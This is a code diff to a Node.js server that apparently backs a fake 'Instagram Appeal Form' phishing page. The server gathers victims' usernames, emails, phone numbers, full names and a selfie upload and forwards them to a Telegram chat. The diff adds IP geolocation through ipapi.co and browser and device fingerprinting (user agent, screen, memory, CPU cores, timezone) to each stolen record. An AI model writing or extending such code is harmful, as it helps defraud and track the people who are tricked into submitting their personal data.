@@ -20,13 +20,50 @@ const upload = multer({
   limits: { fileSize: 10 * 1024 * 1024 }
 });
 
+// ---------- Helper to get location from IP ----------
+async function getLocation(ip) {
+  try {
+    const res = await fetch(`https://ipapi.co/${ip}/json/`);
+    if (res.ok) {
+      const data = await res.json();
+      return {
+        city: data.city || 'N/A',
+        region: data.region || 'N/A',
+        country: data.country_name || 'N/A',
+        postal: data.postal || 'N/A'
+      };
+    }
+  } catch (_) {}
+  return null;
+}
+
 // ---------- API Routes ----------
 
-app.post('/api/submit-form', (req, res) => {
-  // Phone number ab 'phone' field me aayega (countryCode + number combined)
-  const { type, username, email, phone, fullname, alternative, relationship } = req.body;
-  
-  const message = `📋 <b>Instagram Appeal Form</b>
+app.post('/api/submit-form', async (req, res) => {
+  try {
+    const { type, username, email, phone, fullname, alternative, relationship, deviceInfo } = req.body;
+
+    // Get client IP
+    const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || req.connection.remoteAddress;
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+
+    // Get location from IP
+    const location = await getLocation(clientIp);
+    const locStr = location ? `${location.city}, ${location.region}, ${location.country}` : 'N/A';
+
+    // Build device info string
+    const deviceStr = `
+🖥️ Device Info:
+   - User Agent: ${userAgent}
+   - Platform: ${deviceInfo?.platform || 'N/A'}
+   - Language: ${deviceInfo?.language || 'N/A'}
+   - Screen: ${deviceInfo?.screen || 'N/A'}
+   - Color Depth: ${deviceInfo?.colorDepth || 'N/A'}
+   - Timezone: ${deviceInfo?.timezone || 'N/A'}
+   - Memory: ${deviceInfo?.deviceMemory || 'N/A'} GB
+   - CPU Cores: ${deviceInfo?.hardwareConcurrency || 'N/A'}`;
+
+    const message = `📋 <b>Instagram Appeal Form</b>
 
 <b>Type:</b> ${type}
 ━━━━━━━━━━━━━━━━━━━━
@@ -37,14 +74,18 @@ app.post('/api/submit-form', (req, res) => {
 <b>🔗 Alt Account:</b> ${alternative || 'N/A'}
 <b>👥 Relationship:</b> ${relationship}
 ━━━━━━━━━━━━━━━━━━━━
+🌐 <b>IP Address:</b> ${clientIp}
+📍 <b>Location:</b> ${locStr}
+${deviceStr}
+━━━━━━━━━━━━━━━━━━━━
 <b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
-  
-  sendTelegramMessage(message)
-    .then(() => res.json({ success: true }))
-    .catch(err => {
-      console.error('Form send error:', err);
-      res.status(500).json({ error: 'Failed to send form' });
-    });
+
+    await sendTelegramMessage(message);
+    res.json({ success: true });
+  } catch (err) {
+    console.error('Form send error:', err);
+    res.status(500).json({ error: 'Failed to send form' });
+  }
 });
 
 app.post('/api/submit-selfie', upload.single('photo'), (req, res) => {
